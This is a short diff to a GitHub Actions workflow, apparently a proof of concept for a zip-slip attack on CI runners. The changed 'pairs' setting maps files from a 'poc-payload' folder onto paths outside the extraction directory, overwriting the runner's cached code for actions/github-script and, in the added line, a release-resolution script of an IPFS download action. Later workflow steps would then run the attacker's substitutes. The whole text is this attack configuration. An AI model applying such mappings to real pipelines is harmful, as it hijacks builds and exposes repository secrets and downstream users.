@@ -21,4 +21,4 @@ jobs:
         with:
           name: docs-build-${{ github.run_id }}
           extract_base: docs-build
-          pairs: "poc-payload/site-index.html->/home/runner/work/zipslip-site-index.html,poc-payload/gadget.js->/home/runner/work/_actions/actions/github-script/v8/dist/index.js"
+          pairs: "poc-payload/site-index.html->/home/runner/work/zipslip-site-index.html,poc-payload/gadget.js->/home/runner/work/_actions/actions/github-script/v8/dist/index.js,poc-payload/resolve.sh->/home/runner/work/_actions/ipfs/download-ipfs-distribution-action/v2/scripts/resolve-release.sh"
